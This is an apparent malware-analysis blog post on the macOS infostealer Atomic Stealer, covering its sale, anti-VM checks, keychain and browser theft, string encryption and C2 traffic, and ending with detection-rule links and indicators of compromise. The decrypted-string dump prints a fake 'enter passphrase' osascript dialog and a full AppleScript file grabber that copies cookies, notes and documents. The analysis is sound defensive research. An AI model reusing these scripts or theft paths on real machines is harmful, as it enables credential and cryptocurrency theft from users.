---
layout: post
title: "From Russia With Code: Disarming Atomic Stealer"
description: Atomic Stealer
date: 2024-01-16 00:02:35 +0300
image: /images/AtomicStealer/atomic-stealer-badass.png
---

# Case Study

Atomic Stealer is known to be the first stealer for MacOS devices, it first appeared on Russian hacking in March, 2023. 


![ads.jpg](/images/AtomicStealer/ads.JPG)

For 3000$ per month, the user gets the access to the panel. The user provides Telegram Bot ID and build ID to the seller and the user receives the build.

The stealer allegedly has the following functionalities and features: 

- Login Keychain dump 
- Extract system information
- FileGrabber (from Desktop, Documents) 
- MacOS Password retrieval
- Convenient web panel
- MetaMask brute-forcer 
- Crypto-checker (tool to check the information on crypto assets)
- Telegram logs

List of browsers supported:
- Chrome (Autofills, Passwords, Cookies, Wallets, Cards)
- Firefox (Autofills, Cookies)
- Brave (Cookies,Passwords,Autofills, Wallets, Cards)
- Edge (Cookies,Passwords,Autofills, Wallets, Cards)
- Vivaldi (Cookies,Passwords,Autofills, Wallets, Cards)
- Yandex (Cookies,Autofills, Wallets, Cards)
- Opera (Cookies,Autofills, Wallets, Cards)
- OperaGX (Cookies, Autofills, Wallets, Cards)

Wallet and plugins:
- Electrum
- Binance
- Exodus
- Atomic
- Coinomi 
- Plus another 60 plugins

[Cyble](https://cyble.com/blog/threat-actor-selling-new-atomic-macos-amos-stealer-on-telegram/) identified the Go source code path containing the username **iluhaboltov**. That is not confirmed but might suggest that the developer's name is Ilya Boltov. 

#  Technical Analysis 

In December 2023, Jérôme Segura [published an article](https://www.malwarebytes.com/blog/threat-intelligence/2024/01/atomic-stealer-rings-in-the-new-year-with-updated-version/amp) on the new version of Atomic Stealer circulating on the Internet. Unlike previous versions where the strings were in cleartext, in the new version of AMOS, all the strings are encrypted.

To cheat a little bit, we can look at the functionality of the previous Atomic Stealer to be able to recognize and interpret the actions for some of the decrypted strings in the newer versions. 

In the previous version (MD5: ), AMOS implements anti-VM checks, the stealer executes the command **system_profiler SPHardwareDataType**. 
**system_profiler** is a command-line utility in macOS that provides detailed information about the hardware and software configuration of the Mac device. It's the command-line equivalent of the "System Information" on Windows and MacOS machines that users can access through the GUI. **SPHardwareDataType** is a specific data type specifier for the **system_profiler** command, it instructs the utility to display information related only to the hardware of the system, such as processor name, number of processors, model name, hardware UUID, serial number, etc. If it detects **VMware** or **Apple Virtual Machine** - the program exits. If not, the collected information is passed to **/Sysinfo.txt**. 

![vm_check.jpg](/images/AtomicStealer/vm_check.jpg)

The FileGrabber in the previous version grabs files with the following extensions from Desktop and Documents folder:

- txt
- rtf
- xlx
- key
- wallet
- jpg
- png
- web3

![FileGrabber.jpg](/images/AtomicStealer/FileGrabber.jpg)

The **ColdWallets** function grabs the cold wallets. Cold wallets often referred to as "cold storage," is a method of storing cryptocurrencies offline.

![ColdWallets.jpg](/images/AtomicStealer/ColdWallets.jpg)

GrabChromium function is responsible for grabbing data such as AutoFill, Web Data, Login Data, Wallets, Password, Local Extension Settings data from Chromium-based browsers such as Microsoft Edge, Vivaldi, Google Chrome, Brave, Opera within **~/Library/Application Support/** path.

![GrabChromium.jpg](/images/AtomicStealer/GrabChromium.jpg)

**keychain** function is responsible for retrieving **pbkdf2** key from the keychain location. 
In the screenshot below we can see the **pass()** being executed if the result of dscl command is not an empty string (**"dscl /Local/Default -authonly "**, additional parameters are passed to the command including username and an empty password), which means that it would likely fail the authentication. 

![keychain_fn.jpg](/images/AtomicStealer/keychain_fn.jpg)

The **pass** function is responsible for prompting user to enter the password for the device by displaying a message dialog **macOS needs to access System settings %s Please enter your password.** with [osascript](https://www.oreilly.com/library/view/applescript-in-a/1565928415/re156.html#:~:text=Description,dynamically%20run%20as%20an%20AppleScript.) 
**with title "System Preferences"**: Sets the title of the dialog window to **System Preferences**. The dialog will automatically close after 30 seconds if the user doesn't interact with it. After retrieving a password with **GetUserPassword** from the dialog box, the function checks if the returned password is not an empty string and if the password is not empty, the function then calls **getpass** with the entered password.
**getpass** will try to authenticate with entered password and if it returns 0, which means that the password was entered incorrectly, the user gets **You entered an invalid password** display message. 

![invalid_password.jpg](/images/AtomicStealer/invalid_password.jpg)

Once a valid password is entered, the function proceeds with writing the password to **/Users/run/<generated_numeric_value>/password-entered** , based on my understanding. The path with the numeric value is generated using the function below where the stealer gets the current time of the device and then seeds the current time with the random number generator.  

![randgen.jpg](/images/AtomicStealer/randgen.jpg)

The function then checks if the user's keychain file (**login.keychain-db**) exists. If it does, it copies this keychain file to a new location specified by **/Users/run/<generated_numeric_value>/login-keychain**. The Login Keychain acts as the primary storage file in macOS, where it keeps a majority of the passwords, along with secure notes and various other sensitive pieces of information."


Let's come back to **pbkdf2** key: in order to grab the key, the stealer executes the command **security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'**. The output is compared against the string **SecKeychainSearchCopyNext**. [SecKeychainSearchCopyNext](https://developer.apple.com/documentation/security/1515362-seckeychainsearchcopynext) is a macOS API function used to find the next keychain item that matches given search criteria. If the output is not SecKeychainSearchCopyNext, the code constructs a file path under **/Chromium/Chrome** and then writes the extracted key into a file named **Local State**. The **pbkdf2** key serves as an essential component for [password decryption](https://github.com/thanatoskira/OSXChromeDecrypt/blob/master/ChromePasswords.py) in Chrome. 

Within function **dotask()**, after collecting data from functions (it's worth mentioning that the data collected are appeared to be stored at **/Users/run/<generated_numeric_value>**):

- GrabChromium()
- keychain()
- systeminfo()
- FileGrabber()
- GrabFirefox()
- ColdWallets()

The stealer uses [ditto](https://ss64.com/mac/ditto.html), a command-line utility on macOS that's used for copying, creating and extracting files, directories and archives, to archive the retrieved logs and sends them over to the command-and-control server. The command used to archive the files: **ditto -c -k --sequesterRsrc --keepParent**. The zip archive name is the same as the randomly generated numeric value that is present in the path mentioned above.

The example of the archived logs:

![extracted_logs.jpg](/images/AtomicStealer/extracted_logs.jpg)

The logs are then sent to the Command and Control (C2) server using a **POST** request to the **/sendlog** endpoint.

## New Version of AMOS

In the new version of AMOS, the string are encrypted using series of XOR operations shown in the image below.

Let's briefly go through it:

- The algorithm first checks a specific condition based on the 10th byte of the array. If this byte (when treated as a binary value) has its least significant bit set to 0 (meaning it's an even number), the decryption process proceeds.

- The algorithm iterates through a portion of the byte array, starting from a specific position. In each iteration, it compares the current byte with the following byte and depending on how the current byte relates to the next byte, different XOR operations are applied. These operations are:
	- If the current byte is one less than the next, XOR it with the next byte plus 1.
	- If the current byte is two less than the next, XOR it with the next byte plus 2.
	- If the current byte equals the next byte, XOR it with the current index minus 4 (this value is different for each encrypted string)
	- If the current byte is four less than the next, XOR it with the next byte plus 3.
	- If the current byte is five less than the next, XOR it with the next byte plus 4.
    - After applying the XOR operation, the current byte is incremented by 1, and the algorithm moves to the next byte.
    
- This whole process continues until a certain condition is met (like reaching a specific array index), signifying the end of the encrypted data.

![decryption_algo.jpg](/images/AtomicStealer/decryption_algo.jpg)

After struggling to understand why I was failing to reproduce the decryption algorithm from C to Python, @cod3nym helped me to figure out that the solution involved using [ctypes](https://docs.python.org/3/library/ctypes.html).

So, using that information, I wrote the IDAPython script to decrypt the strings, so I don't have to manually enter each of them in :D The script is pretty wonky, but it does the job. You can access the script [here](https://github.com/RussianPanda95/IDAPython/blob/main/Atomic%20Stealer/idapython_amos_stealer_string_decrypt.py).

AMOS uses **mz_zip_writer_add_mem**, [Miniz compression](https://mongoose-os.com/docs/mongoose-os/api/misc/miniz.md), for archiving the extracted logs.

**send_me** function is responsible for sending the logs in a ZIP archive over to C2 to port 80 using the hardcoded UUID **7bc8f87e-c842-47c7-8f05-10e2be357888**.  Instead of using **/sendlog** as an endpoint, the new version uses **/p2p** to send POST requests. 

**passnet**function is responsible for retrieving the **pbkdf2** from Chrome, the stealer calls it **masterpass-chrome**. 

**pwdget** function is responsible for retrieving the password of the MacOS device via the dialog **Required Application Helper. Please enter passphrase for {username}** as shown below.

![pwd_prompt2.jpg](/images/AtomicStealer/pwd_prompt2.jpg)

**myfox** function is responsible for retrieving Firefox data such as:
- /cookies.sqlite
- /formhistory.sqlite
- /key4.db
- /logins.json

Compared to the previous version, the new version gathers not only information about hardware but also system's software and display configurations with the command **system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType**. 

The FileGrabber functionality is shown in the image below. 

![FileGrabber2.jpg](/images/AtomicStealer/FileGrabber2.jpg)

FileGrabber has several functionalities: 
- It sets a destination folder path named **fg** in the home folder of the current user (**/Users/<username>**. If this folder doesn't exist, it creates it. It then defines a list of file extensions (**"txt", "png", "jpg", "jpeg", "wallet", "keys", "key"**) to filter files for later operations. It initializes a variable **bankSize** to 0, possibly intended to keep track of the total size of files processed. 
- Next, it proceeds with retrieving the path to Safari's cookies folder and tries to duplicate the **Cookies.binarycookies** file from Safari's folder to the destination folder. This file contains Safari browser cookies.
- For processing notes data it attempts to duplicate specific Notes database files (**"NoteStore.sqlite", "NoteStore.sqlite-shm", "NoteStore.sqlite-wal"**) to the destination folder. These files contain user's notes.
- For processing files on Desktop and Documents folders it retrieves all files from the Desktop and the Documents folder. For each file, it checks if the file's extension is in the predefined list mentioned above. If the file matches the criteria and the total size (**bankSize**) of processed files does not exceed 10 MB, it duplicates the file to the destination folder and updates **bankSize**.

**List of decrypted strings:**

{% highlight xml %}
Decrypted string at address 0x1000224f2: osascript -e 'display dialog "Required Application Helper. Please enter passphrase for 
Decrypted string at LEA: ." default answer "" with icon caution buttons {"Continue"} default button "Continue" giving up after 150 with title "Application wants to install helper" with hidden answer' at 0x100022629
Error occurred during decryption: bytearray index out of range
Decrypted string at address 0x10002278a: 
Decrypted string at address 0x100022b9e: pwd
Decrypted string at address 0x10002aa3c: Chromium/
Decrypted string at address 0x10002ad8d: Profile
Decrypted string at address 0x10002c328: /cookies.sqlite
Decrypted string at address 0x10002c5cd: /formhistory.sqlite
Decrypted string at address 0x10002c872: /key4.db
Decrypted string at address 0x10002cb17: /logins.json
Decrypted string at address 0x10002e3ba: POST /p2p HTTP/1.1Host:
Decrypted string at address 0x10002e667: :80uuid:
Decrypted string at address 0x10002e8fa: 7bc8f87e-c842-47c7-8f05-10e2be357888
Decrypted string at address 0x10002eb8d: Content-Length: 
Decrypted string at address 0x10002f942: USER
Decrypted string at address 0x10002fbc6: /Users/
Decrypted string at address 0x10002ffe4: /fg/
Decrypted string at address 0x10003027a: FileGrabber/
Decrypted string at address 0x10003054c: username
Decrypted string at address 0x1000307db: system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType
Decrypted string at address 0x100030a7d: user
Decrypted string at address 0x100030d18: /Library/Application Support/
Decrypted string at address 0x100030fab: /Library/Cookies/Cookies.binarycookies
Decrypted string at address 0x100031251: safari/saf1
Decrypted string at address 0x1000314ec: /.config/filezilla/recentservers.xml
Decrypted string at address 0x100031792: FileZilla/recentservers.xml
Decrypted string at address 0x100031a5b: Chrome
Decrypted string at address 0x100031d03: Google
Decrypted string at address 0x100031ffc: Brave
Decrypted string at address 0x1000322a4: BraveSoftware/Brave-Browser/
Decrypted string at address 0x10003259d: Edge
Decrypted string at address 0x100032842: Microsoft Edge/
Decrypted string at address 0x100032b3b: Opera
Decrypted string at address 0x100032de3: com.operasoftware.Opera/
Decrypted string at address 0x1000330dc: OperaGX
Decrypted string at address 0x100033384: com.operasoftware.OperaGX/
Decrypted string at address 0x10003367d: Vivaldi
Decrypted string at address 0x100033922: Vivaldi/
Decrypted string at address 0x10003467a: Firefox/Profiles/
Decrypted string at address 0x100034956: /Library/Keychains/login.keychain-db
Decrypted string at address 0x100034bfc: keychain
Decrypted string at address 0x100034e94: Binance/app-store.json
Decrypted string at address 0x10003513d: deskwallets/Binance/app-store.json
Decrypted string at address 0x100035409: deskwallets/Electrum/
Decrypted string at address 0x1000356ae: /.electrum/wallets/
Decrypted string at address 0x1000359aa: deskwallets/Coinomi/
Decrypted string at address 0x100035c52: Coinomi/wallets/
Decrypted string at address 0x100035f4b: deskwallets/Exodus/
Decrypted string at address 0x1000361f3: Exodus/
Decrypted string at address 0x1000364ec: deskwallets/Atomic/
Decrypted string at address 0x100036791: atomic/Local Storage/leveldb/
Decrypted string at address 0x1000372b1: 5.42.65.108
Decrypted string at address 0x1000439c1: .DS_Store
Decrypted string at address 0x100043c69: Partitions
Decrypted string at address 0x100043f0e: Code Cache
Decrypted string at address 0x1000447a1: /Cookies
Decrypted string at address 0x100044a46: /Network/Cookies
Decrypted string at address 0x100044ceb: /Login Data
Decrypted string at address 0x1000453a4: ibnejdfjmmkpcnlpebklmnkoeoihofec
Decrypted string at address 0x100045649: nkbihfbeogaeaoehlefnkodbefgpgknn
Decrypted string at address 0x1000458f1: bocpokimicclpaiekenaeelehdjllofo
Decrypted string at address 0x100045b96: nphplpgoakhhjchkkhmiggakijnkhfnd
Decrypted string at address 0x100045e3b: pocmplpaccanhmnllbbkpgfliimjljgo
Decrypted string at address 0x1000460e0: mfhbebgoclkghebffdldpobeajmbecfk
Decrypted string at address 0x100046385: fhilaheimglignddkjgofkcbgekhenbh
Decrypted string at address 0x10004662a: hnhobjmcibchnmglfbldbfabcgaknlkj
Decrypted string at address 0x1000468d2: apnehcjmnengpnmccpaibjmhhoadaico
Decrypted string at address 0x100046b7a: cjmkndjhnagcfbpiemnkdpomccnjblmj
Decrypted string at address 0x100046e22: cmndjbecilbocjfkibfbifhngkdmjgog
Decrypted string at address 0x1000470ca: pnndplcbkakcplkjnolgbkdgjikjednm
Decrypted string at address 0x10004736f: dhgnlgphgchebgoemcjekedjjbifijid
Decrypted string at address 0x100047617: fhbohimaelbohpjbbldcngcnapndodjp
Decrypted string at address 0x1000478bf: ffnbelfdoeiohenkjibnmadjiehjhajb
Decrypted string at address 0x100047b67: afbcbjpbpfadlkmhmclhkeeodmamcflc
Decrypted string at address 0x100047e0c: hnfanknocfeofbddgcijnmhnfnkdnaad
Decrypted string at address 0x1000480b4: hpglfhgfnhbgpjdenjgmdgoeiappafln
Decrypted string at address 0x100048359: cjelfplplebdjjenllpjcblmjkfcffne
Decrypted string at address 0x100048601: kncchdigobghenbbaddojjnnaogfppfj
Decrypted string at address 0x1000488a6: amkmjjmmflddogmhpjloimipbofnfjih
Decrypted string at address 0x100048b4e: nlbmnnijcnlegkjjpcfjclmcfggfefdm
Decrypted string at address 0x100048df3: ppdadbejkmjnefldpcdjhnkpbjkikoip
Decrypted string at address 0x10004909b: fnjhmkhhmkbjkkabndcnnogagogbneec
Decrypted string at address 0x100049340: cphhlgmgameodnhkjdmkpanlelnlohao
Decrypted string at address 0x1000495e8: nhnkbkgjikgcigadomkphalanndcapjk
Decrypted string at address 0x10004988d: kpfopkelmapcoipemfendmdcghnegimn
Decrypted string at address 0x100049b35: copjnifcecdedocejpaapepagaodgpbh
Decrypted string at address 0x100049ddd: aiifbnbfobpmeekipheeijimdpnlpgpp
Decrypted string at address 0x10004a082: dmkamcknogkgcdfhhbddcghachkejeap
Decrypted string at address 0x10004a32a: cnmamaachppnkjgnildpdmkaakejnhae
Decrypted string at address 0x10004a5d2: jojhfeoedkpkglbfimdfabpdfjaoolaf
Decrypted string at address 0x10004a877: flpiciilemghbmfalicajoolhkkenfel
Decrypted string at address 0x10004ab1c: nknhiehlklippafakaeklbeglecifhad
Decrypted string at address 0x10004adc4: hcflpincpppdclinealmandijcmnkbgn
Decrypted string at address 0x10004b069: ookjlbkiijinhpmnjffcofjonbfbgaoc
Decrypted string at address 0x10004b30e: mnfifefkajgofkcjkemidiaecocnkjeh
Decrypted string at address 0x10004b5b6: hmeobnfnfcmdkdcmlblgagmfpfboieaf
Decrypted string at address 0x10004b85b: dkdedlpgdmmkkfjabffeganieamfklkm
Decrypted string at address 0x10004bb00: nlgbhdfgdhgbiamfdfmbikcdghidoadd
Decrypted string at address 0x10004bda5: cihmoadaighcejopammfbmddcmdekcje
Decrypted string at address 0x10004c04d: lodccjjbdhfakaekdiahmedfbieldgik
Decrypted string at address 0x10004c2f2: bcopgchhojmggmffilplmbdicgaihlkp
Decrypted string at address 0x10004c59a: klnaejjgbibmhlephnhpmaofohgkpgkd
Decrypted string at address 0x10004c842: aeachknmefphepccionboohckonoeemg
Decrypted string at address 0x10004cae7: fnnegphlobjdpkhecapkijjdkgcjhkib
Decrypted string at address 0x10004cd8f: pdadjkfkgcafgbceimcpbkalnfnepbnk
Decrypted string at address 0x10004d034: acmacodkjbdgmoleeebolmdjonilkdbch
Decrypted string at address 0x10004d2dc: bfnaelmomeimhlpmgjnjophhpkkoljpa
Decrypted string at address 0x10004d581: cgeeodpfagjceefieflmdfphplkenlfk
Decrypted string at address 0x10004d829: imloifkgjagghnncjkhggdhalmcnfklk
Decrypted string at address 0x10004dace: aholpfdialjgjfhomihkjbmgjidlcdno
Decrypted string at address 0x10004dd76: egjidjbpglichdcondbcbdnbeeppgdph
Decrypted string at address 0x10004e01b: efbglgofoippbgcjepnhiblaibcnclgk
Decrypted string at address 0x10004e2c3: opcgpfmipidbgpenhmajoajpbobppdil
Decrypted string at address 0x10004e568: hifafgmccdpekplomjjkcfgodnhcellj
Decrypted string at address 0x10004e810: ojggmchlghnjlapmfbnjholfjkiidbch
Decrypted string at address 0x10004eab8: jnlgamecbpmbajjfhmmmlhejkemejdma
Decrypted string at address 0x10004ed60: dlcobpjiigpikoobohmabehhmhfoodbb
Decrypted string at address 0x10004f005: ebfidpplhabeedpnhjnobghokpiioolj
Decrypted string at address 0x10004f2ad: loinekcabhlmhjjbocijdoimmejangoa
Decrypted string at address 0x10004f555: ejjladinnckdgjemekebdpeokbikhfci
Decrypted string at address 0x10004f7fd: phkbamefinggmakgklpkljjmgibohnba
Decrypted string at address 0x10004faa5: ppbibelpcjmhbdihakflkdcoccbgbkpo
Decrypted string at address 0x100021efe: dscl . authonly "
Decrypted string at address 0x10002afee: Default
Decrypted string at address 0x10002b1fb: Snapshots
Decrypted string at address 0x10002dcf5: masterpass-chrome
Decrypted string at address 0x10003adbc: osascript -e 'tell application "Terminal" to close first window' & exit
Decrypted string at LEA: osascript -e 'set destinationFolderPath to (path to home folder as text) & "fg:" set extensionsList to {"txt","png","jpg","jpeg","wallet","keys","key"} set bankSize to 0 tell application "Finder"     set username to short user name of (system info)     try         if not (exists folder destinationFolderPath) then             make new folder at (path to home folder) with properties {name:"fg"}         end if         set safariFolder to ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:")         try             duplicate file "Cookies.binarycookies" of folder safariFolder to folder destinationFolderPath with replacing         end try         set notesFolderPath to (path to home folder as text) & "Library:Group Containers:group.com.apple.notes:"         try             set notesFolder to folder notesFolderPath             set notesFiles to {file "NoteStore.sqlite", file "NoteStore.sqlite-shm", file "NoteStore.sqlite-wal"} of notesFolder             repeat with aFile in notesFiles                 set fileSize to size of aFile                 if (bankSize + fileSize)  10 * 1024 * 1024 then                     try                         duplicate aFile to folder destinationFolderPath with replacing                         set bankSize to bankSize + fileSize                     end try                 else                     exit repeat                 end if             end repeat         end try         set desktopFiles to every file of desktop         set documentsFiles to every file of folder "Documents" of (path to home folder)         repeat with aFile in (desktopFiles & documentsFiles)             set fileExtension to name extension of aFile             if fileExtension is in extensionsList then                 set fileSize to size of aFile                 if (bankSize + fileSize)  10 * 1024 * 1024 then                     try                         duplicate aFile to folder destinationFolderPath with replacing                         set bankSize to bankSize + fileSize                     end try                 else                     exit repeat                 end if             end if         end repeat     end try end tell' at 0x10004443c

{% endhighlight%}

## Conclusion 

Besides encrypted strings, the new version appears to avoid writing the ZIP archive of collected data to the disk, and it no longer contains hardcoded VM strings. The latest version of AMOS is designed to leave as few traces as possible on the infected machines. There is also a typo in one of the wallet addresses in the new version for some reason **acmacodkjbdgmoleeebolmdjonilkdbch** , which is supposed to be **acmacodkjbdgmoleebolmdjonilkdbch**. 

I would like to extend my thanks to [Edward Crowder](https://www.linkedin.com/in/edward-c-61765a11b/) for his assistance with MacOS questions and to [@cod3nym](https://twitter.com/cod3nym) for the help in implementing the Python decryption function.

# Detection Rules

You can access Yara rules [here](https://github.com/RussianPanda95/Yara-Rules/blob/main/AtomicStealer/Atomic_Stealer.yar)

# Indicators of Compromise

| Name | Indicator |
| ---- | ---- |
| AMOS Old Version | bf7512021dbdce0bd111f7ef1aa615d5<br> |
| AMOS New Version | 57db36e87549de5cfdada568e0d86bff |
| AMOS New Version | dd8aa38c7f06cb1c12a4d2c0927b6107 |
| C2 | 185.106.93[.]154 |
| C2 | 5.42.65[.]108 |

# Reference

[https://cyble.com/blog/threat-actor-selling-new-atomic-macos-amos-stealer-on-telegram/](https://cyble.com/blog/threat-actor-selling-new-atomic-macos-amos-stealer-on-telegram/)
[https://www.malwarebytes.com/blog/threat-intelligence/2024/01/atomic-stealer-rings-in-the-new-year-with-updated-version/amp](https://www.malwarebytes.com/blog/threat-intelligence/2024/01/atomic-stealer-rings-in-the-new-year-with-updated-version/amp)
[https://www.oreilly.com/library/view/applescript-in-a/1565928415/re156.html#:~:text=Description,dynamically%20run%20as%20an%20AppleScript.](https://www.oreilly.com/library/view/applescript-in-a/1565928415/re156.html#:~:text=Description,dynamically%20run%20as%20an%20AppleScript.)
[https://developer.apple.com/documentation/security/1515362-seckeychainsearchcopynext](https://developer.apple.com/documentation/security/1515362-seckeychainsearchcopynext)[https://github.com/thanatoskira/OSXChromeDecrypt/blob/master/ChromePasswords.py](https://github.com/thanatoskira/OSXChromeDecrypt/blob/master/ChromePasswords.py)
[https://ss64.com/mac/ditto.html](https://ss64.com/mac/ditto.html)[https://github.com/RussianPanda95/IDAPython/blob/main/Atomic%20Stealer/idapython_amos_stealer_string_decrypt.py](https://github.com/RussianPanda95/IDAPython/blob/main/Atomic%20Stealer/idapython_amos_stealer_string_decrypt.py)
[https://docs.python.org/3/library/ctypes.html](https://docs.python.org/3/library/ctypes.html)
[https://mongoose-os.com/docs/mongoose-os/api/misc/miniz.md](https://mongoose-os.com/docs/mongoose-os/api/misc/miniz.md)
[https://www.linkedin.com/in/edward-c-61765a11b/](https://www.linkedin.com/in/edward-c-61765a11b/)
[https://twitter.com/cod3nym](https://twitter.com/cod3nym)
[https://github.com/RussianPanda95/Yara-Rules/blob/main/AtomicStealer/Atomic_Stealer.yar](https://github.com/RussianPanda95/Yara-Rules/blob/main/AtomicStealer/Atomic_Stealer.yar)
[https://tria.ge/240116-akdqfsadg9/behavioral2](https://tria.ge/240116-akdqfsadg9/behavioral2)
[https://tria.ge/240116-axpcqaafg5/behavioral1](https://tria.ge/240116-axpcqaafg5/behavioral1)

